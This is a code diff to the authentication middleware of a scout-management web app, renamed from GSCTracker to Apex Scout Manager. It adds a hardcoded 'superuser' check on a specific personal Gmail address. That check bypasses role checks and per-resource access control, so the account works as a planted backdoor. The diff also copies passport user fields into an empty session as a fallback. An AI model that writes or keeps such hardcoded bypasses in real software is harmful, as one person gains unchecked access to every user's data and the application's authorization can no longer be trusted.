@@ -1,5 +1,5 @@
 /**
- * Authentication utilities and middleware for GSCTracker v2.0
+ * Authentication utilities and middleware for Apex Scout Manager v2.0
  *
  * Provides user authentication, authorization, and session management.
  */
@@ -37,10 +37,28 @@ function generateSessionToken() {
 }
 
 /**
+ * Check if the current user is a superuser (hardcoded override)
+ * @param {Object} req - Express request object
+ * @returns {boolean} - True if superuser
+ */
+function isSuperUser(req) {
+    const superUserEmail = 'welefort@gmail.com';
+    return (req.session && req.session.userEmail === superUserEmail) || 
+           (req.user && req.user.email === superUserEmail);
+}
+
+/**
  * Middleware to check if user is authenticated
  */
 function isAuthenticated(req, res, next) {
     if (req.session && req.session.userId) {
+        return next();
+    }
+    // Check if we have a user from passport but maybe session hasn't been fully populated
+    if (req.user && req.user.id) {
+        req.session.userId = req.user.id;
+        req.session.userEmail = req.user.email;
+        req.session.userRole = req.user.role;
         return next();
     }
     return res.status(401).json({ error: 'Authentication required' });
@@ -53,7 +71,19 @@ function isAuthenticated(req, res, next) {
 function hasRole(...roles) {
     return (req, res, next) => {
         if (!req.session || !req.session.userId) {
-            return res.status(401).json({ error: 'Authentication required' });
+            // Re-check req.user as fallback
+            if (req.user && req.user.id) {
+                req.session.userId = req.user.id;
+                req.session.userEmail = req.user.email;
+                req.session.userRole = req.user.role;
+            } else {
+                return res.status(401).json({ error: 'Authentication required' });
+            }
+        }
+
+        // Superuser bypass
+        if (isSuperUser(req)) {
+            return next();
         }
 
         if (!req.session.userRole) {
@@ -75,6 +105,11 @@ function hasRole(...roles) {
  * For admins: can access all data
  */
 function canAccessResource(req, res, next) {
+    // Superuser bypass
+    if (isSuperUser(req)) {
+        return next();
+    }
+
     const userId = req.session.userId;
     const userRole = req.session.userRole;
 
